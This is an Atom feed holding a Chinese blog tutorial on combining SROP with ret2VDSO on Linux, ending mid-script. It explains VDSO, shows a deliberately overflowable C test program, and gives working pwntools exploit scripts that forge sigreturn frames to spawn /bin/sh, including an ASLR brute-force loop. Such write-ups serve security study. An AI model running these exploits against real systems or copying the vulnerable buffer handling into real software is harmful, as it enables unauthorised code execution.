<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AssassinQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.b3ale.cn/"/>
  <updated>2020-03-15T06:44:41.488Z</updated>
  <id>blog.b3ale.cn/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Use SROP with ret2VDSO</title>
    <link href="blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/"/>
    <id>blog.b3ale.cn/2020/03/14/Use-SROP-with-ret2VDSO/</id>
    <published>2020-03-14T02:24:24.000Z</published>
    <updated>2020-03-15T06:44:41.488Z</updated>
    
    <content type="html"><![CDATA[<p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p><a id="more"></a><h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p><blockquote><p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p></blockquote><p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /bin/sh</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffda1746000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</span><br></pre></td></tr></table></figure><p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p><h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p><ul><li><code>sysenter</code></li><li><code>sysexit</code></li></ul><p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p><p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/3i 0xffffffffff600000</span><br><span class="line">   0xffffffffff600000:mov    rax,0x60</span><br><span class="line">   0xffffffffff600007:syscall</span><br><span class="line">   0xffffffffff600009:ret</span><br></pre></td></tr></table></figure><p>可以写一个程序做一个系统调用的测试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">time_t</span> <span class="params">(*time_func)</span><span class="params">(<span class="keyword">time_t</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">time_t</span> tloc;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    time_func func = (time_func) <span class="number">0xffffffffff600000</span>;</span><br><span class="line"></span><br><span class="line">    retval = func(&amp;tloc);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"time_func"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, tloc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p><h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ebp ; mov ebp, esp</span><br></pre></td></tr></table></figure><p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p><h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p><ol><li>暴力破解</li><li>通过泄漏<ul><li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li><li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li><li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul><li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li><li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li></ul></li></ul></li></ol><p>查看存储 VDSO 的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso</span><br><span class="line">$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</span><br></pre></td></tr></table></figure><p>查看 VDSO 的地址（直接 vmmap 也行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso</span><br><span class="line">$2 = (const Elf32_Ehdr *) 0xf7fd8000</span><br></pre></td></tr></table></figure><p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; info auxv</span><br><span class="line">32   AT_SYSINFO           Special system info/entry points 0xf7fd8b50</span><br><span class="line">33   AT_SYSINFO_EHDR      System-supplied DSO&apos;s ELF header 0xf7fd8000 &lt;--- Address of VDSO</span><br><span class="line">16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff</span><br><span class="line">6    AT_PAGESZ            System page size               4096</span><br><span class="line">17   AT_CLKTCK            Frequency of times()           100</span><br><span class="line">3    AT_PHDR              Program headers for program    0x8048034</span><br><span class="line">4    AT_PHENT             Size of program header entry   32</span><br><span class="line">5    AT_PHNUM             Number of program headers      9</span><br><span class="line">7    AT_BASE              Base address of interpreter    0xf7fd9000</span><br><span class="line">8    AT_FLAGS             Flags                          0x0</span><br><span class="line">9    AT_ENTRY             Entry point of program         0x8048340</span><br><span class="line">11   AT_UID               Real user ID                   0</span><br><span class="line">12   AT_EUID              Effective user ID              0</span><br><span class="line">13   AT_GID               Real group ID                  0</span><br><span class="line">14   AT_EGID              Effective group ID             0</span><br><span class="line">23   AT_SECURE            Boolean, was exec setuid-like? 0</span><br><span class="line">25   AT_RANDOM            Address of 16 random bytes     0xffffd8cb</span><br><span class="line">31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;</span><br><span class="line">15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;</span><br><span class="line">0    AT_NULL              End of vector                  0x0</span><br></pre></td></tr></table></figure><p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /bin/ls</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)</span><br><span class="line">libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ldd /bin/ls; <span class="keyword">done</span> | grep 0x00007ffff7ffa000</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>] = <span class="string">"/bin/sh\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwnme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">char</span> *welcome = <span class="string">"&gt; "</span>;</span><br><span class="line">    write(<span class="number">1</span>, welcome, <span class="number">2</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x400</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">pwnme();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/3i 0xf7fd8b71</span><br><span class="line">   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:mov    eax,0x77</span><br><span class="line">   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:int    0x80</span><br><span class="line">   0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;:nop</span><br></pre></td></tr></table></figure><p>关闭 ASLR 对 ret2VDSO 进行测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'lxterminal'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x804a020</span></span><br><span class="line">bss_addr = <span class="number">0x804a030</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">vdso_addr = <span class="number">0xf7fd8000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Try vdso %s'</span> % hex(vdso_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x110</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">"i386"</span>)</span><br><span class="line">frame.eax = constants.SYS_execve</span><br><span class="line">frame.ebx = bin_sh_addr</span><br><span class="line">frame.eip = vdso_addr + <span class="number">0xb76</span> <span class="comment"># address of int 0x80</span></span><br><span class="line">frame.esp = bss_addr</span><br><span class="line">frame.ebp = bss_addr</span><br><span class="line">frame.gs = <span class="number">0x63</span></span><br><span class="line">frame.cs = <span class="number">0x23</span></span><br><span class="line">frame.es = <span class="number">0x2b</span></span><br><span class="line">frame.ds = <span class="number">0x2b</span></span><br><span class="line">frame.ss = <span class="number">0x2b</span></span><br><span class="line">ret_addr = vdso_addr + <span class="number">0xb71</span> <span class="comment"># address of sigreturn</span></span><br><span class="line">payload += p32(ret_addr) + str(frame)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'echo pwned'</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">'pwned'</span>)</span><br><span class="line"><span class="keyword">if</span> data != <span class="string">'pwned'</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception, <span class="string">'Failed'</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x804a020</span></span><br><span class="line">bss_addr = <span class="number">0x804a030</span></span><br><span class="line">vdso_range = range(<span class="number">0xf7600000</span>, <span class="number">0xf7700000</span>, <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    context.arch = <span class="string">'i386'</span></span><br><span class="line">    p = process(<span class="string">'./main'</span>)</span><br><span class="line">    <span class="keyword">global</span> vdso_addr</span><br><span class="line">    vdso_addr = random.choice(vdso_range)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Try vdso %s'</span> % hex(vdso_addr)</span><br><span class="line">    payload = <span class="string">'A'</span> * <span class="number">0x110</span></span><br><span class="line">    frame = SigreturnFrame(kernel=<span class="string">"i386"</span>)</span><br><span class="line">    frame.eax = constants.SYS_execve</span><br><span class="line">    frame.ebx = bin_sh_addr</span><br><span class="line">    frame.eip = vdso_addr + <span class="number">0xb76</span> <span class="comment"># address of int 0x80</span></span><br><span class="line">    frame.esp = bss_addr</span><br><span class="line">    frame.ebp = bss_addr</span><br><span class="line">    frame.gs = <span class="number">0x63</span></span><br><span class="line">    frame.cs = <span class="number">0x23</span></span><br><span class="line">    frame.es = <span class="number">0x2b</span></span><br><span class="line">    frame.ds = <span class="number">0x2b</span></span><br><span class="line">    frame.ss = <span class="number">0x2b</span></span><br><span class="line">    ret_addr = vdso_addr + <span class="number">0xb71</span> <span class="comment"># address of sigreturn</span></span><br><span class="line">    payload += p32(ret_addr) + str(frame)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">'echo pwned'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'pwned'</span>)</span><br><span class="line">    <span class="keyword">if</span> data != <span class="string">'pwned'</span>:</span><br><span class="line">        info(<span class="string">'Failed'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">global</span> p, vdso_addr</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Try %d'</span> % i</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            bruteforce()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            info(<span class="string">'Wrong VDSO'</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        info(<span class="string">'vdso_addr = '</span> + hex(vdso_addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">jmp _start</span><br><span class="line">vuln:</span><br><span class="line">sub rsp, 8</span><br><span class="line">mov rax, 0 ; sys_read</span><br><span class="line">xor rdi, rdi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 1024</span><br><span class="line">syscall</span><br><span class="line">add rsp, 8</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">call vuln</span><br><span class="line">mov rax, 60 ; sys_exit</span><br><span class="line">xor rdi, rdi</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">gadgets:</span><br><span class="line">mov rdi, 1</span><br><span class="line">ret</span><br><span class="line">mov rax, 15</span><br><span class="line">ret</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context.terminal = ['lxterminal', '-e']</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># id's of Auxillary Vectors</span></span><br><span class="line">AT_SYSINFO_EHDR = <span class="number">0x21</span></span><br><span class="line">AT_HWCAP = <span class="number">0x10</span></span><br><span class="line">AT_PAGESZ = <span class="number">0x06</span></span><br><span class="line">AT_CLKTCK = <span class="number">0x11</span></span><br><span class="line">AT_PHDR = <span class="number">0x03</span></span><br><span class="line">AT_PHENT = <span class="number">0x04</span></span><br><span class="line">AT_PHNUM = <span class="number">0x05</span></span><br><span class="line">AT_BASE = <span class="number">0x07</span></span><br><span class="line">AT_FLAGS = <span class="number">0x08</span></span><br><span class="line">AT_ENTRY = <span class="number">0x09</span></span><br><span class="line">AT_UID = <span class="number">0x0b</span></span><br><span class="line">AT_EUID = <span class="number">0x0c</span></span><br><span class="line">AT_GID = <span class="number">0x0d</span></span><br><span class="line">AT_EGID = <span class="number">0x0e</span></span><br><span class="line">AT_SECURE = <span class="number">0x17</span></span><br><span class="line">AT_RANDOM = <span class="number">0x19</span></span><br><span class="line">AT_EXECFN = <span class="number">0x1f</span></span><br><span class="line">AT_PLATFORM = <span class="number">0x0f</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x400082</span></span><br><span class="line">set_write = <span class="number">0x4000ac</span></span><br><span class="line">syscall_addr = <span class="number">0x400096</span></span><br><span class="line">set_sigreturn = <span class="number">0x4000b2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">payload += p64(set_write)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">8</span></span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span></span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">ENV_AUX_VEC = p.recv(<span class="number">1024</span>)</span><br><span class="line">QWORD_LIST = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ENV_AUX_VEC), <span class="number">8</span>):</span><br><span class="line">    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + <span class="number">8</span>]))</span><br><span class="line">start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) <span class="comment"># 计算AUXV的起始地址</span></span><br><span class="line">info(hex(start_aux_vec))</span><br><span class="line">AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (<span class="number">18</span> * <span class="number">2</span>)] <span class="comment"># size of auxillary table</span></span><br><span 